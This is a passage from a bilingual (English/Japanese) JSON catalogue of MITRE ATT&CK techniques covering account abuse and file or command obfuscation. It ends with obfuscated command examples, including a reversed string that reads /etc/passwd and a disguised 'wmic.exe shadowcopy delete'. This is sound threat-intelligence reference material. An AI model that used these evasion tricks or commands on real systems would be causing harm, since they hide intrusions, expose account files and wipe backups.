                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ドメインアカウントの資格情報を取得して悪用する可能性があります。(引用: TechNet Credential Theft) ドメインアカウントとは、Active Directoryドメインサービスによって管理され、そのドメインの一部であるシステムおよびサービス全体でアクセスと権限が構成されるものです。ドメインアカウントには、ユーザー、管理者、およびサービスが含まれます。(引用: Microsoft AD Accounts)\n\n攻撃者は、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)やパスワードの再利用など、さまざまな手段を通じて、一部は高レベルの特権を持つドメインアカウントを侵害し、ドメインの特権リソースへのアクセスを許可する可能性があります。"
                    },
                    {
                        "id": "T1078.003",
                        "name_eng": "Local Accounts",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ローカルアカウントの資格情報を取得して悪用する可能性があります。ローカルアカウントとは、ユーザー、リモートサポート、サービス、または単一のシステムやサービスの管理のために組織によって構成されたものです。\n\nローカルアカウントは、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)を通じて権限を昇格させたり、資格情報を収集したりするために悪用されることもあります。パスワードの再利用により、権限昇格や横方向の移動を目的として、ネットワーク上の一連のマシンでローカルアカウントが悪用される可能性があります。"
                    },
                    {
                        "id": "T1078.001",
                        "name_eng": "Default Accounts",
                        "name_jp": "デフォルトアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、デフォルトアカウントの資格情報を取得して悪用する可能性があります。デフォルトアカウントとは、WindowsシステムのゲストアカウントやAdministratorアカウントなど、OSに組み込まれているアカウントです。デフォルトアカウントには、AWSのルートユーザーアカウント、ESXiのルートユーザーアカウント、Kubernetesのデフォルトサービスアカウントなど、他の種類のシステム、ソフトウェア、またはデバイスのデフォルトの工場出荷時/プロバイダー設定アカウントも含まれます。(引用: Microsoft Local Accounts Feb 2019)(引用: AWS Root User)(引用: Threat Matrix for Kubernetes)\n\nデフォルトアカウントはクライアントマシンに限定されません。むしろ、内部、オープンソース、または商用であるかどうかにかかわらず、ネットワークデバイスやコンピュータアプリケーションなどの機器にあらかじめ設定されているアカウントも含まれます。ユーザー名とパスワードの組み合わせがあらかじめ設定されているアプライアンスは、インストール後に変更しない組織にとっては攻撃者の格好の標的となるため、深刻な脅威となります。同様に、攻撃者は、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモート環境に正当に接続するために、公に開示された、または盗まれた[秘密キー](https://attack.mitre.org/techniques/T1552/004)または資格情報資料を利用することもあります。(引用: Metasploit SSH Module)\n\nデフォルトアカウントは、別のアプリケーションに接続または統合することにより、初期設定後にシステム上に作成される場合があります。例えば、ESXiサーバーがvCenterサーバーに接続されると、ESXiサーバー上に`vpxuser`というデフォルトの特権アカウントが作成されます。脅威アクターがこのアカウントの資格情報を侵害できた場合（例えば、vCenterホスト上の[資格情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)を介して）、ESXiサーバーにアクセスできるようになります。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用: Pentera vCenter Information Disclosure)"
                    }
                ]
            },
            {
                "id": "T1027",
                "name_eng": "Obfuscated Files or Information",
                "name_jp": "難読化されたファイルまたは情報",
                "description_eng": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",
                "description_jp": "攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。\n\nペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。\n\nファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)\n\n攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)",
                "subtechniques": [
                    {
                        "id": "T1027.005",
                        "name_eng": "Indicator Removal from Tools",
                        "name_jp": "ツールからのインジケーター削除",
                        "description_eng": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
                        "description_jp": "攻撃者は、自分の悪意のあるツールが検出、隔離、またはその他の方法で抑制されたと判断した場合、ツールからインジケーターを削除する可能性があります。彼らはインジケーターを削除してツールを変更し、ターゲットの防御システムや同様のシステムを使用する可能性のある後続のターゲットによって検出されなくなった更新バージョンを使用できます。\n\nこの良い例は、マルウェアがファイル署名で検出され、ウイルス対策ソフトウェアによって隔離された場合です。マルウェアがファイル署名のために隔離されたと判断できる攻撃者は、その署名を明示的に回避するようにファイルを変更し、その後マルウェアを再利用する可能性があります。"
                    },
                    {
                        "id": "T1027.009",
                        "name_eng": "Embedded Payloads",
                        "name_jp": "埋め込みペイロード",
                        "description_eng": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) \n\nEmbedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",
                        "description_jp": "攻撃者は、防御から悪意のあるコンテンツを隠すために、他のファイル内にペイロードを埋め込む可能性があります。一見無害に見えるファイル（スクリプトや実行可能ファイルなど）が悪用されて、悪意のあるペイロードやコンテンツを運び、難読化する可能性があります。場合によっては、埋め込みペイロードにより、デジタル署名や公証チケットなどの実行制御に影響を与えずに、攻撃者が[信頼制御の破壊](https://attack.mitre.org/techniques/T1553)を可能にすることもあります。(引用: Sentinel Labs)\n\n攻撃者は、ペイロードを隠すためにさまざまなファイル形式にペイロードを埋め込む可能性があります。(引用: Microsoft Learn) これは[ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)に似ていますが、正当なデジタルメディア形式に関連する特定のバイトやパターンに悪意のあるコンテンツを織り込むことはありません。(引用: GitHub PSImage)\n\n例えば、攻撃者はペイロードを良性のバイナリ内またはそのオーバーレイとして埋め込んでいることが確認されています。(引用: Securelist Dtrack2) 攻撃者はまた、同じ形式のファイル内にペイロード（実行可能ファイルや実行専用スクリプトなど）をネストしていることも確認されています。(引用: SentinelLabs reversing run-only applescripts 2021)\n\n埋め込みコンテンツは、良性のシステムプロセスに感染させるために使用される[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)ペイロードとして使用されることもあります。(引用: Trend Micro) これらの埋め込まれた後注入されたペイロードは、オーケストレーターモジュールをサポートするためにC2通信を暗号化するなどの特定の機能を提供するように設計されたマルウェアのモジュールの一部として使用される場合があります。例えば、埋め込みモジュールがデフォルトのブラウザに注入され、攻撃者がネットワーク経由で通信できるようになる場合があります。(引用: Malware Analysis Report ComRAT)"
                    },
                    {
                        "id": "T1027.013",
                        "name_eng": "Encrypted/Encoded File",
                        "name_jp": "暗号化/エンコードされたファイル",
                        "description_eng": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
                        "description_jp": "攻撃者は、文字列、バイト、その他の特定のパターンを難読化して検出を妨げるために、ファイルを暗号化またはエンコードする可能性があります。ファイルのコンテンツを暗号化および/またはエンコードすることは、侵入で使用されるファイル内の悪意のあるアーティファクトを隠蔽することを目的としています。[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)、[ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)、[埋め込みペイロード](https://attack.mitre.org/techniques/T1027/009)など、他の多くのテクニックもこの広範な目的を共有しています。ファイルを暗号化および/またはエンコードすると、静的署名の検出が遅れる可能性があり、この悪意のあるコンテンツは実行/使用時にのみ明らかになります（つまり、[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)）。\n\nこのタイプのファイル難読化は、マルウェアのログ/構成ファイルやペイロードファイルなど、被害者ホスト上に存在する多くのファイルアーティファクトに適用できます。(引用: File obfuscation) ファイルは、ハードコードされたキーまたはユーザー提供のキーで暗号化したり、Base64などの標準エンコーディングスキームを使用して他の方法で難読化したりできます。\n\nファイルのコンテンツ全体を難読化することも、特定の関数や値（C2アドレスなど）のみを難読化することもできます。暗号化とエンコーディングは、追加の保護のために冗長なレイヤーで適用される場合もあります。\n\n例えば、攻撃者はパスワードで保護されたWord文書や自己解凍（SFX）アーカイブを悪用して、[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードなどのファイルを暗号化/エンコードする方法として使用する可能性があります。これらのファイルは通常、ファイルが呼び出されたときに実行される解凍スタブに目的のアーカイブコンテンツを添付することによって機能します（例：[ユーザー実行](https://attack.mitre.org/techniques/T1204)）。(引用: SFX - Encrypted/Encoded File)\n\n攻撃者はまた、ファイル固有のエンコーディングスキームやカスタムエンコーディングスキームを悪用する可能性があります。例えば、テキストファイルのバイトオーダーマーク（BOM）ヘッダーを悪用して、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)の実行までファイルコンテンツを操作および難読化する可能性があります。"
                    },
                    {
                        "id": "T1027.012",
                        "name_eng": "LNK Icon Smuggling",
                        "name_jp": "LNKアイコンスマグリング",
                        "description_eng": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
                        "description_jp": "攻撃者は、一見無害に見えるWindowsショートカットファイル内に隠すことで、悪意のあるペイロードをダウンロードするコマンドをコンテンツフィルター経由で密輸する可能性があります。Windowsショートカットファイル（.LNK）には、ホストディレクトリ内のLNKファイルに表示されるアイコンファイルへのパスを指定するように設計されたアイコンロケーションフィールド（`IconEnvironmentDataBlock`とも呼ばれる）を含む多くのメタデータフィールドが含まれています。\n\n攻撃者はこのLNKメタデータを悪用して悪意のあるペイロードをダウンロードする可能性があります。例えば、攻撃者はマルウェアを配信するためのフィッシングペイロードとしてLNKファイルを使用していることが確認されています。呼び出されると（例：[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）、LNKアイコンロケーションフィールド内の外部URLを介して参照されるペイロードがダウンロードされる可能性があります。これらのファイルはまた、LNKのターゲットパスフィールド内の[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)/[システムバイナリプロキシ実行](https://attack.mitre.org/techniques/T1218)引数によって呼び出される可能性もあります。(引用: Unprotect Shortcut)(引用: Booby Trap Shortcut 2017)\n\nLNKアイコンスマグリングは、侵害後の悪意のあるスクリプトが感染したホスト上でLNKを実行して追加の悪意のあるペイロードをダウンロードするなど、侵害後にも利用される可能性があります。"
                    },
                    {
                        "id": "T1027.017",
                        "name_eng": "SVG Smuggling",
                        "name_jp": "SVGスマグリング",
                        "description_eng": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. \n\nSVG smuggling can take a number of forms. For example, threat actors may include content that: \n\n* Assembles malicious payloads(Citation: Talos SVG Smuggling 2022)\n* Downloads malicious payloads(Citation: Cofense SVG Smuggling 2024)\n* Redirects users to malicious websites(Citation: Bleeping Computer SVG Smuggling 2024)\n* Displays interactive content to users, such as fake login forms and download buttons.(Citation: Bleeping Computer SVG Smuggling 2024)\n\nSVG Smuggling may be used in conjunction with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where an SVG with a malicious payload is included inside an HTML file.(Citation: Talos SVG Smuggling 2022) SVGs may also be included in other types of documents, such as PDFs.",
                        "description_jp": "攻撃者は、一見無害に見えるSVGファイル内に悪意のあるペイロードを隠すことにより、コンテンツフィルターを通過させてデータやファイルを密輸する可能性があります。(引用: Trustwave SVG Smuggling 2025) SVG（スケーラブルベクターグラフィックス）は、XMLを使用して構築されたベクターベースの画像ファイルです。そのため、正当に`<script>`タグを含めることができ、これにより攻撃者は悪意のあるJavaScriptペイロードを含めることができます。ただし、SVGは画像ファイルとして扱われることが多いため、他の種類の実行可能ファイルよりもユーザーにとって疑わしく見えない可能性があります。\n\nSVGスマグリングにはさまざまな形態があります。例えば、脅威アクターは次のようなコンテンツを含める可能性があります：\n\n* 悪意のあるペイロードの組み立て(引用: Talos SVG Smuggling 2022)\n* 悪意のあるペイロードのダウンロード(引用: Cofense SVG Smuggling 2024)\n* ユーザーを悪意のあるウェブサイトへリダイレクト(引用: Bleeping Computer SVG Smuggling 2024)\n* 偽のログインフォームやダウンロードボタンなど、ユーザーへのインタラクティブなコンテンツの表示(引用: Bleeping Computer SVG Smuggling 2024)\n\nSVGスマグリングは、悪意のあるペイロードを含むSVGがHTMLファイル内に含まれる[HTMLスマグリング](https://attack.mitre.org/techniques/T1027/006)と組み合わせて使用される場合があります。(引用: Talos SVG Smuggling 2022) SVGは、PDFなど他の種類のドキュメントに含まれる場合もあります。"
                    },
                    {
                        "id": "T1027.006",
                        "name_eng": "HTML Smuggling",
                        "name_jp": "HTMLスマグリング",
                        "description_eng": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",
                        "description_jp": "攻撃者は、一見無害に見えるHTMLファイル内に悪意のあるペイロードを隠すことにより、コンテンツフィルターを通過させてデータやファイルを密輸する可能性があります。HTMLドキュメントは、JavaScript Blob（生のバイトを表す不変データ）として知られる大きなバイナリオブジェクトを格納でき、これは後でファイルのようなオブジェクトに構築できます。データはまた、メディアタイプまたはMIMEファイルをHTMLドキュメントにインラインで埋め込むことを可能にするデータURLに格納することもできます。HTML5では、ファイルのダウンロードを開始するために使用できるダウンロード属性も導入されました。(引用: HTML Smuggling Menlo Security 2020)(引用: Outlflank HTML Smuggling 2018)\n\n攻撃者は、JavaScript BlobやHTML5ダウンロード属性を悪用することにより、HTMLスマグリングを通じてセキュリティ制御をバイパスするペイロードを被害者に配信する可能性があります。Webコンテンツフィルターなどのセキュリティ制御は、コンテンツが通常良性のMIMEタイプ（<code>text/plain</code>や<code>text/html</code>など）に基づいている可能性があるため、HTML/JSファイル内の密輸された悪意のあるファイルを識別できない場合があります。悪意のあるファイルやデータは、データURLやJavaScript Blobを介してHTMLファイル内に難読化されて隠蔽され、被害者に到達したときに難読化解除できます（つまり、[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)）。これにより、コンテンツフィルターをバイパスできる可能性があります。\n\n例えば、JavaScript Blobは、被害者のマシンで悪意のあるファイルを動的に生成するために悪用される可能性があり、<code>msSaveBlob</code>などのJavaScript関数を悪用することによってディスクにドロップされる可能性があります。(引用: HTML Smuggling Menlo Security 2020)(引用: MSTIC NOBELIUM May 2021)(引用: Outlflank HTML Smuggling 2018)(引用: nccgroup Smuggling HTA 2017)"
                    },
                    {
                        "id": "T1027.011",
                        "name_eng": "Fileless Storage",
                        "name_jp": "ファイルレスストレージ",
                        "description_eng": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless)",
                        "description_jp": "攻撃者は、防御から悪意のあるアクティビティを隠蔽するために、「ファイルレス」形式でデータを保存する可能性があります。ファイルレスストレージは、ファイル以外の任意の形式として広く定義できます。Windowsシステムにおける不揮発性ファイルレスストレージの一般的な例としては、Windowsレジストリ、イベントログ、またはWMIリポジトリがあります。(引用: Microsoft Fileless)(引用: SecureList Fileless) Linuxシステムでは、`/dev/shm`、`/run/shm`、`/var/run`、`/var/lock`などの共有メモリディレクトリもファイルレスストレージと見なされる場合があります。これらのディレクトリに書き込まれたファイルはRAMに直接マップされ、ディスクには保存されません。(引用: Elastic Binary Executed from Shared Memory Directory)(引用: Akami Frog4Shell 2024)(引用: Aquasec Muhstik Malware 2024)\n\n[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620)や[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のようなファイルレスのメモリ内動作と同様に、ファイルレスデータストレージは、ディスクストレージから特定のファイル形式にしかアクセスできないウイルス対策ソフトやその他のエンドポイントセキュリティツールによって検出されないままになる可能性があります。ファイルレスストレージを利用することで、攻撃者はLinuxの読み取り専用ファイルシステムが提供する保護をバイパスすることも可能になります。(引用: Sysdig Fileless Malware 23022)\n\n攻撃者は、ペイロード/シェルコード（潜在的に[永続性](https://attack.mitre.org/tactics/TA0003)の一部として使用される）や、まだ被害者から持ち出されていない収集済みデータ（例：[ローカルデータステージング](https://attack.mitre.org/techniques/T1074/001)）など、さまざまな種類の保存データを隠蔽するためにファイルレスストレージを使用する場合があります。攻撃者はまた、保存時にこのファイルレスデータを暗号化、エンコード、分割、またはその他の方法で難読化することがよくあります。\n\nファイルレスストレージアクティビティの一部の形式は、ファイルシステムに間接的にアーティファクトを作成する可能性がありますが、WMI（例：`%SystemRoot%\\System32\\Wbem\\Repository`）やレジストリ（例：`%SystemRoot%\\System32\\Config`）の物理ファイルなど、中央の、または他の方法では検査が困難な形式で作成します。(引用: Microsoft Fileless)"
                    },
                    {
                        "id": "T1027.014",
                        "name_eng": "Polymorphic Code",
                        "name_jp": "ポリモーフィックコード",
                        "description_eng": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) \nOther obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)",
                        "description_jp": "攻撃者は、検出を回避するためにポリモーフィックコード（メタモーフィックコードまたはミューテーティングコードとも呼ばれる）を利用する可能性があります。ポリモーフィックコードは、コード実行中にランタイムフットプリントを変更できるソフトウェアの一種です。(引用: polymorphic-blackberry) ソフトウェアを実行するたびに、コードは元のコードと同じ目的または目標を達成する別のバージョンに変化します。この機能により、マルウェアはウイルス対策ツールやマルウェア対策ツールなどの従来の署名ベースの防御を回避できます。(引用: polymorphic-sentinelone)\nその他の難読化テクニックは、[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)、または[暗号化/エンコードされたファイル](https://attack.mitre.org/techniques/T1027/013)などのアクションを実行するためにミューテーションエンジンを使用するなど、意図した効果を達成するためにポリモーフィックコードと組み合わせて使用できます。(引用: polymorphic-linkedin)(引用: polymorphic-medium)"
                    },
                    {
                        "id": "T1027.010",
                        "name_eng": "Command Obfuscation",
                        "name_jp": "コマンド難読化",
                        "description_eng": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard 